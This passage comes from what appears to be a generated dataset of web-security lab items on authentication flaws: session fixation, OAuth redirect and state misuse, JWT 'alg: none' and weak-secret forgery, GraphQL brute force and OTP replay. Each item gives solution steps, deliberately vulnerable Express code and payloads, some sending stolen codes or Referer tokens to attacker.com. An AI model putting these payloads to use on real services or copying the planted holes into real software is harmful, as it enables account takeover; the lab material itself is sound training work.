    "Lab Description": "This lab suffers from a session fixation flaw. The server allows clients to supply a session ID via URL, which is not regenerated after login. To solve: fix the session for the victim, then log them in and hijack their session to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.With OWASP ZAP, craft a GET request to /login?session=attacker-session-id and open the resulting login form.",
      "2.Use credential stuffing to log in as the victim in the same session ID.",
      "3.Once logged in, close the session.",
      "4.Reuse the same session ID in your own browser to access /my-account.",
      "5.Verify access by confirming the victim's username is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const session = req.query.session || Math.random().toString(36).substring(7); res.cookie('sid', session); res.send('<form method=\"POST\" action=\"/login\">Login here</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; sessions[sid] = { user: 'carlos' }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.user === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "/login?session=abc123",
      "Set-Cookie: sid=abc123; path=/"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration exposing authorization code",
    "Lab Description": "This lab simulates a third-party OAuth login integration using an insecure redirect URI. The application accepts arbitrary redirect URIs, enabling interception of authorization codes. To solve: capture an authorization code meant for the victim and exchange it to access the victim's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Postman to simulate an OAuth login flow and inspect the redirect URI after successful authorization.",
      "2.Exploit the redirect_uri parameter to point to an attacker-controlled endpoint.",
      "3.Log in as the victim and complete the OAuth flow, capturing the authorization code on your server.",
      "4.Exchange the code manually via a direct POST to the token endpoint and obtain an access token.",
      "5.Use the token to impersonate the victim and access /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const code = 'authcode-' + user; tokens[code] = user; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; const user = tokens[code]; if (user) res.json({ access_token: 'token-' + user }); else res.status(400).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = token?.split('-')[1]; if (user) res.send(`Account info for ${user}`); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "/auth?user=carlos&redirect_uri=http://attacker.com/capture",
      "POST /token with code=authcode-carlos",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering in Authorization header",
    "Lab Description": "The application uses JWTs to authenticate users but does not verify their integrity properly. The secret key is weak and predictable. The application uses the token to authorize access to admin-only features. To solve: Forge a valid token for the admin user and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and analyze the Authorization: Bearer header after logging in as a normal user.",
      "Decode the JWT using jwt.io and identify its algorithm as 'HS256' with 'user': 'guest'.",
      "Brute-force the weak secret using jwt_tool.py or hashcat against a common wordlist.",
      "Craft a new JWT with payload {\"user\":\"admin\"} and sign it using the discovered secret.",
      "Replace the Authorization header with the new token and access /admin to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'mysecret'; app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Token required'); const decoded = jwt.verify(token, SECRET); if (decoded.user !== 'admin') return res.status(403).send('Forbidden'); res.send('Welcome admin!'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.FAKE_SIGNATURE",
      "Modified JWT with {\"alg\":\"HS256\",\"user\":\"admin\"} signed using 'mysecret'"
    ]
  },
  {
    "Lab scenario": "Session fixation via static session ID in cookie",
    "Lab Description": "The application uses a predictable session ID issued before authentication and does not regenerate it upon login. To solve: Fixate a session on the victim and log in with their account using the fixed session cookie.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP, monitor cookies set during the login process and confirm sessionID remains unchanged.",
      "Manually visit the site as an unauthenticated user and capture the Set-Cookie value.",
      "Trick the victim into logging in while using the attacker's fixed session ID (e.g., via iframe or phishing).",
      "After victim logs in, reuse the same session ID in your browser to access their authenticated content.",
      "Visit /account and verify that it shows victim-specific content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36); res.cookie('sid', sid); sessions[sid] = sessions[sid] || {}; res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.sid; sessions[sid].user = username; res.send('Logged in'); } else { res.status(403).send('Invalid'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]?.user; if (user) res.send(`Account: ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Pre-assigned session ID: attacker sets sid=abc123 and sends victim phishing URL with that cookie",
      "Session reuse after victim login with sid=abc123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login",
    "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate the `state` parameter, exposing it to CSRF-like attacks. To solve: Exploit the flow to log in as another user by hijacking their OAuth session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the OAuth login flow using Burp Suite and observe that 'state' is either missing or reused.",
      "Initiate an OAuth flow with your own account and capture the final redirect URL containing the 'code'.",
      "Send the redirect URL to the victim with a spoofed state or hijack their browser with the link.",
      "Upon victim completing OAuth, their access code is redirected to the attacker's origin.",
      "Replay the captured code with your own session to become authenticated as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const fetch = require('node-fetch'); app.get('/oauth/callback', async (req, res) => { const { code } = req.query; const tokenResp = await fetch('https://oauth-provider/token', { method: 'POST', body: `code=${code}` }); const token = await tokenResp.text(); res.cookie('token', token); res.send('Logged in'); }); app.listen(3000);",
    "payloads": [
      "https://target.com/oauth/callback?code=validVictimCode",
      "Replay victim's code without verifying `state`"
    ]
  },
  {
    "Lab scenario": "GraphQL login brute-force with verbose error feedback",
    "Lab Description": "The GraphQL API provides detailed error messages and lacks rate-limiting. A login mutation exposes different errors for invalid usernames and passwords. To solve: Enumerate a valid username, then brute-force the password.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send GraphQL login mutations and analyze error messages for invalid usernames.",
      "Automate username brute-force via script or Burp Intruder with GraphQL queries.",
      "Once a valid username is found (error changes), switch to password brute-forcing.",
      "Identify successful login by error message absence or token returned.",
      "Use returned token to access authenticated GraphQL query and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const users = { carlos: 's3cret' }; const schema = buildSchema(`type Query { login(username: String!, password: String!): String }`); const root = { login: ({ username, password }) => { if (!users[username]) throw new Error('Username not found'); if (users[username] !== password) throw new Error('Incorrect password'); return 'token-abc123'; } }; const app = express(); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4000);",
    "payloads": [
      "{ login(username: \"admin\", password: \"wrong\") }",
      "{ login(username: \"carlos\", password: \"s3cret\") }"
    ]
  },
  {
    "Lab scenario": "Verbose logging reveals valid credentials",
    "Lab Description": "The backend logs contain full authentication requests and responses, including credentials. These logs are exposed via a debug endpoint. To solve: Locate and extract admin credentials from logs, then log in and access /admin.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Browse the /debug/logs endpoint using Burp Suite and check for verbose output.",
      "Identify entries like POST /login containing plaintext usernames and passwords.",
      "Find an entry where 'username=admin' and note the password.",
      "Login via POST /login using the stolen credentials.",
      "Access /admin and verify you have admin privileges."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); let logs = []; app.use(bodyParser.urlencoded({ extended: true })); const users = { admin: 'adminpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; logs.push(`LOGIN ATTEMPT: ${username}:${password}`); if (users[username] === password) res.send('Logged in'); else res.status(403).send('Denied'); }); app.get('/debug/logs', (req, res) => { res.send(logs.join('\\n')); }); app.get('/admin', (req, res) => { res.send('Admin Dashboard'); }); app.listen(3000);",
    "payloads": [
      "Visit /debug/logs to retrieve: LOGIN ATTEMPT: admin:adminpass",
      "POST /login with admin:adminpass"
    ]
  },
  {
    "Lab scenario": "JWT tampering in REST API authentication flow",
    "Lab Description": "The application uses stateless JWTs to authenticate users on its REST API. However, the backend fails to validate the token signature properly. The application accepts unsigned tokens or those signed with a known weak key. To solve: tamper with a valid JWT to escalate privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture the Authorization Bearer JWT from a successful login.",
      "Decode the token using jwt.io and observe the 'alg' is set to 'HS256'. Try changing it to 'none'.",
      "Modify the payload to {\"role\":\"admin\"} and remove the signature part, then resend the token in the Authorization header.",
      "If that fails, use a wordlist with `jwt_tool` to brute-force the HMAC secret (e.g., 'secret', 'admin', etc.) and sign a tampered token with 'admin' privileges.",
      "Access the /api/admin endpoint with the forged token and verify the response contains admin-level content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = { alice: 'password1', admin: 'adminpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username, role: username === 'admin' ? 'admin' : 'user' }, 'secret'); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome admin'); res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "{\"alg\":\"none\",\"typ\":\"JWT\"}.{\"role\":\"admin\"}",
      "JWT signed with HMAC 'secret' and payload {\"role\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Session fixation in login redirection flow",
    "Lab Description": "The application assigns a session ID before the user is authenticated and fails to regenerate the session after login. This allows an attacker to fix a victim’s session ID prior to authentication. To solve: Fix a known session and take over the victim’s account after they log in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the Set-Cookie: sessionId response when visiting the login page.",
      "Send the fixed sessionId to the victim via a crafted link using an open redirect or iframe injection.",
      "Wait for the victim to log in using the fixed session ID.",
      "Re-use the same sessionId in your browser to hijack the session.",
      "Access /my-account to confirm the takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { carlos: 'securepass' }; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sessionId', sid); res.sendFile(__dirname + '/login.html'); }); app.post('/login', (req, res) => { const sid = req.cookies.sessionId; const { username, password } = req.body; if (users[username] === password) { sessions[sid].username = username; sessions[sid].authenticated = true; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.sessionId]; if (session?.authenticated) return res.send(`Account: ${session.username}`); res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Crafted link with fixed sessionId: http://target.com/login?sessionId=attacker123",
      "Burp-modified Set-Cookie header replay with known sessionId"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party provider login",
    "Lab Description": "The app uses OAuth 2.0 with a third-party provider (e.g., GitHub) for authentication. However, the client fails to validate the issuer and audience of the returned access token. To solve: Forge a token from a malicious OAuth server and gain access to another user's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to observe the OAuth login flow and identify the token exchange endpoint.",
      "Set up a fake OAuth server using mitmproxy or Evilginx2 that returns self-issued tokens with arbitrary 'sub' and 'email' fields.",
      "Initiate login via the legitimate flow, intercept the token request, and replay it to your fake server.",
      "Inject a token claiming to be the victim (e.g., sub: carlos, email: carlos@example.com).",
      "Verify access to /my-account under the victim's identity."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const fetch = require('node-fetch'); app.get('/oauth/callback', async (req, res) => { const { code } = req.query; const tokenResponse = await fetch(`http://oauth-provider/token?code=${code}`); const { access_token } = await tokenResponse.json(); const userInfo = jwt.decode(access_token); res.cookie('session', access_token); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const user = jwt.decode(token); res.send(`Welcome ${user.email}`); }); app.listen(3000);",
    "payloads": [
      "JWT with {\"sub\":\"carlos\",\"email\":\"carlos@example.com\"} signed by attacker",
      "OAuth callback with attacker-signed token"
    ]
  },
  {
    "Lab scenario": "MFA bypass via predictable OTP replay",
    "Lab Description": "The application uses TOTP-based 2FA codes during login, but fails to invalidate or rate-limit them after submission. An attacker who intercepts or guesses a recent OTP can reuse it. To solve: Replay a valid OTP for Carlos to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login to your own account and intercept the OTP request with Burp Proxy.",
      "Capture the OTP and observe its time-based nature. Identify if replay is possible.",
      "Send a valid login request with Carlos's credentials, then submit your previously captured OTP immediately after.",
      "If rate-limiting is missing, your OTP will be accepted even if not generated for Carlos.",
      "Access the account page to confirm success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const users = { carlos: 'secretpass' }; let validOtps = {}; app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { validOtps[username] = '654321'; res.status(200).send('Enter OTP'); } else { res.status(401).send('Invalid'); } }); app.post('/verify-otp', (req, res) => { const { username, otp } = req.body; if (otp === validOtps[username]) res.send('Logged in'); else res.status(403).send('Wrong OTP'); }); app.listen(3000);",
    "payloads": [
      "Replay intercepted OTP 654321",
      "Use static OTP valid for multiple users"
    ]
  },
  {
    "Lab scenario": "GraphQL introspection leaking login structure",
    "Lab Description": "The application exposes an unauthenticated GraphQL endpoint with introspection enabled. This allows discovery of internal mutations and input fields used in login. To solve: Discover and exploit the login mutation to access the admin account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use GraphQL Voyager or graphql-playground to introspect the /graphql endpoint.",
      "Identify the login mutation and its required parameters (e.g., username, password).",
      "Send a mutation login(username:\"admin\", password:\"adminpass\") via Postman.",
      "Capture the session cookie or token returned on successful login.",
      "Access the /admin panel to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const express = require('express'); const app = express(); const schema = buildSchema(`type Query { _: Boolean } type Mutation { login(username: String!, password: String!): String }`); const root = { login: ({ username, password }) => { if (username === 'admin' && password === 'adminpass') return 'token123'; throw new Error('Invalid credentials'); } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(3000);",
    "payloads": [
      "mutation { login(username:\"admin\", password:\"adminpass\") }",
      "GraphQL introspection query"
    ]
  },
  {
    "Lab scenario": "JWT tampering in REST API authorization",
    "Lab Description": "This lab uses stateless JWTs for user authentication in a RESTful API. The application fails to verify the integrity of JWT signatures properly. The token is signed with the algorithm 'none', and the server does not validate the signature field. To solve: Forge a valid token for the user 'carlos' and access the protected /api/user-info endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture your own login request and extract the JWT from the Authorization header.",
      "Validate the token structure in jwt.io and note that it uses alg: none.",
      "Manually craft a new token replacing your username with 'carlos' and set alg: none, then remove the signature part.",
      "Use Postman or curl to send a GET request to /api/user-info with the forged token in the Authorization header.",
      "If the server responds with carlos’s data, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; const users = { carlos: { role: 'admin' }, alice: { role: 'user' } }; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, '', { algorithm: 'none' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); const user = users[payload.username]; if (!user) return res.status(401).send('Unauthorized'); res.json({ user }); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "This lab suffers from a session fixation vulnerability. The application accepts arbitrary session identifiers provided by the user before authentication. It fails to generate a new session token upon successful login. To solve: Pre-set a session cookie for Carlos, trick him into logging in, and reuse the same session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to visit the site while unauthenticated and intercept the response to inject a controlled Set-Cookie: session=attackersessionid.",
      "Create a CSRF proof-of-concept page that performs a login for Carlos using the known session value.",
      "Trigger Carlos to visit the CSRF page and log in using the pre-set session.",
      "Use the same session ID in your browser to access /my-account and confirm you are logged in as Carlos.",
      "Check for a personalized greeting or sensitive information to verify exploitation success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'pass123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'guest-session'; sessions[sid] = username; res.send('Logged in'); } else { res.status(403).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: session=attackersessionid",
      "<form method='POST' action='http://vulnerable-site/login'><input name='username' value='carlos'><input name='password' value='pass123'></form>",
      "Cookie: session=attackersessionid"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in GraphQL token exchange",
    "Lab Description": "This lab uses a misconfigured OAuth flow embedded in a GraphQL endpoint. The application accepts a third-party-issued OAuth token for internal user actions without validating the token audience (aud claim). To solve: Acquire an access token from a mock OAuth provider and use it to fetch Carlos’s private notes using a GraphQL mutation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to simulate login at the OAuth provider and obtain a valid access token.",
      "Decode the JWT using jwt.io and confirm the 'aud' claim is not verified by the backend.",
      "Send a crafted GraphQL query using the Authorization header with the third-party token.",
      "Submit a query like { getPrivateNotes(user: \"carlos\") } to the /graphql endpoint.",
      "If the private notes are returned, the lab is solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { getPrivateNotes(user: String): String }`); const root = { getPrivateNotes: ({ user }, req) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token); if (!decoded || !user) return null; return user === 'carlos' ? 'Sensitive notes for Carlos' : 'No notes'; } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4000);",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2FybG9zIiwiYXVkIjoiYXBwIn0.signature",
      "{ \"query\": \"{ getPrivateNotes(user: \\\"carlos\\\") }\" }"
    ]
  },
  {
    "Lab scenario": "Session fixation via cookie injection in login flow",
    "Lab Description": "This lab simulates a flawed session management implementation that permits session fixation via pre-login cookie injection. The application fails to regenerate session identifiers upon successful authentication. To solve: Hijack Carlos’s session by crafting a fixed session ID and getting him to use it, then access his My account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using OWASP ZAP, intercept the GET /login request and observe the Set-Cookie response.",
      "2.Note that the same session cookie is reused after login, indicating no regeneration.",
      "3.Create a malicious link containing a pre-set session ID, such as: http://vulnerable.site/login with Cookie: sessionId=attackersession.",
      "4.Trick Carlos into using this link (assumed simulated click in lab environment).",
      "5.Login to the application with Carlos’s credentials using the same session ID and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionId || Math.random().toString(36).substr(2); res.cookie('sessionId', sessionId); res.sendFile(__dirname + '/login.html'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) { res.send(`Welcome ${username}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: sessionId=fixed123",
      "POST /login HTTP/1.1\\nCookie: sessionId=fixed123\\nusername=carlos&password=letmein"
    ]
  },
  {
    "Lab scenario": "JWT signature validation disabled in API login handler",
    "Lab Description": "This lab’s API endpoint incorrectly disables JWT signature verification. The backend trusts unsigned JWTs when the 'alg' is set to 'none'. To solve: Forge an unsigned JWT that grants admin access and retrieve the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.With Burp Suite, intercept a successful login and extract the JWT from the Authorization header.",
      "2.Decode the token using jwt.io and observe the 'alg' is 'HS256'.",
      "3.Replace the algorithm to 'none' and remove the signature section.",
      "4.Change the payload 'role' to 'admin'.",
      "5.Use Postman to send an Authorization: Bearer <forged token> to /admin and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, 'secret'); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); } const user = jwt.verify(token, 'secret'); if (user.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leads to token reuse in third-party callback",
    "Lab Description": "This lab uses OAuth 2.0 for login via a third-party provider. It incorrectly trusts the 'state' parameter and does not validate token ownership. To solve: Reuse an access token from your account and access Carlos's dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp to intercept the OAuth login flow for your account and extract the access_token.",
      "2.Inspect the GET /oauth/callback?access_token=<token>&state=<user> request structure.",
      "3.Modify the request to replace 'state' parameter with carlos while keeping your access_token.",
      "4.Resend the modified callback request.",
      "5.Visit /dashboard while authenticated as Carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { 'access-token-abc': 'wiener', 'access-token-def': 'carlos' }; app.get('/oauth/callback', (req, res) => { const { access_token, state } = req.query; const user = users[access_token]; if (user) { req.session = { user: state }; res.redirect('/dashboard'); } else { res.send('Invalid token'); } }); app.get('/dashboard', (req, res) => { if (req.session && req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Please login'); } }); app.listen(5000);",
    "payloads": [
      "GET /oauth/callback?access_token=access-token-abc&state=carlos",
      "GET /dashboard"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via verbose login API responses",
    "Lab Description": "This lab's login endpoint leaks too much information via verbose error messages, facilitating credential stuffing. The error reveals whether the username or password is incorrect. To solve: Enumerate Carlos’s credentials and log in to his account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1.Use Burp Suite Intruder to fuzz the username field using a list of common usernames and observe response messages.",
      "2.Find the username that triggers 'Incorrect password' error – this confirms it exists.",
      "3.Use Burp Intruder’s password attack with a common password list against the valid username.",
      "4.Identify the login response with 302 status or 'Welcome' message.",
      "5.Log in to /my-account using the identified credentials."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Username not found'); if (user.password !== password) return res.status(401).send('Incorrect password'); res.send(`Welcome ${username}`); }); app.get('/my-account', (req, res) => { res.send('Sensitive account details for carlos'); }); app.listen(4000);",
    "payloads": [
      "username=admin&password=wrong",
      "username=carlos&password=123456",
      "username=carlos&password=supersecure"
    ]
  },
{
  "Lab scenario": "JWT algorithm confusion in REST API login",
  "Lab Description": "The backend accepts a JWT token for authentication, but improperly trusts the algorithm field in the token header. The application fails to enforce signature verification when `alg` is set to `none`. To solve: log in as the user 'carlos' by forging a valid JWT token and access the protected /my-account endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to capture a valid JWT from your own login flow in the Authorization header.",
    "2. Decode the JWT at jwt.io or using Burp Decoder to inspect its header and payload.",
    "3. Modify the JWT header to set \"alg\": \"none\" and the payload to { \"username\": \"carlos\" }.",
    "4. Remove the signature portion of the JWT and reassemble it as base64(header).base64(payload).",
    "5. Send a GET /my-account request with the forged token in the Authorization: Bearer header to access Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'carlos': { password: 'secret123' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'supersecretkey', { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Access granted to carlos'); } else { try { const verified = jwt.verify(token, 'supersecretkey'); if (verified.username === 'carlos') return res.send('Access granted to carlos'); } catch (e) { return res.status(403).send('Invalid signature'); } } res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('JWT Lab running at http://localhost:3000'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "{\"alg\": \"none\"}, {\"username\": \"carlos\"}"
  ]
},
{
  "Lab scenario": "OAuth implicit flow token leakage via Referer header",
  "Lab Description": "The application uses OAuth with an implicit flow for third-party authentication, where the access token is returned in the URL fragment. A misconfigured redirect leaks this token via the Referer header to a third-party domain. To solve: leak Carlos’s token and use it to access /oauth/me.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to proxy the OAuth login flow and inspect the redirect URI for token handling.",
    "2. Observe that the access_token appears in the URL fragment (e.g., #access_token=abc123) after login.",
    "3. Note that the final redirect goes to a third-party image or iframe endpoint, causing the Referer header to leak the entire original URL with token.",
    "4. Use a crafted phishing page or injected iframe to trigger Carlos's login and capture the Referer header server-side.",
    "5. Replay the stolen token via GET /oauth/me with Authorization: Bearer <token> to access the victim’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const oauthTokens = { 'abc123': 'carlos' }; app.get('/redirect', (req, res) => { const html = `<img src='http://attacker.com/log?ref=${req.headers.referer}' />`; res.send(html); }); app.get('/oauth/me', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (oauthTokens[token] === 'carlos') { return res.send('Carlos OAuth profile'); } res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Implicit Token Leak Lab running on port 3000'));",
  "payloads": [
    "#access_token=abc123",
    "Authorization: Bearer abc123",
    "https://victim-app.com/redirect#access_token=abc123"
  ]
},
{
  "Lab scenario": "Session fixation via pre-login Set-Cookie in SOAP-based login",
  "Lab Description": "The application uses a SOAP endpoint for login and fails to issue a new session identifier after successful authentication. This allows an attacker to predefine the session token used by the victim. To solve: fix the session token for Carlos, then hijack it after he logs in and access /account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to capture a POST /soap/login SOAP request and inspect the Set-Cookie behavior.",
    "2. Note that a session token is issued before login and not regenerated afterward.",
    "3. Send Carlos a crafted link containing the session ID as a cookie using a CSRF bait or GET request with embedded JavaScript.",
